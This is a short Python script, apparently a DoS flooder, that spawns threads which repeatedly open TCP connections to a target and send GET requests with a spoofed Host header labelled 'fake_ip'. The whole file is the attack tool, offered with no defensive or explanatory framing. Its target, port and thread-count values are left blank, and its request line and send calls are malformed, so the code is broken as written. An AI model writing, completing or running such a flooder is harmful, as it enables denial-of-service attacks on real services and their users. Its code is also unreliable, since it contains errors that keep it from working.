import threading
import socket

target=""
port=""
fake_ip=""

already_connected=0

def attack():
    while True:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(("GET / " + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.send(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global already_connected
        already_connected += 1

for i in range():
    thread=threading.Thread(target=attack)
    thread.start()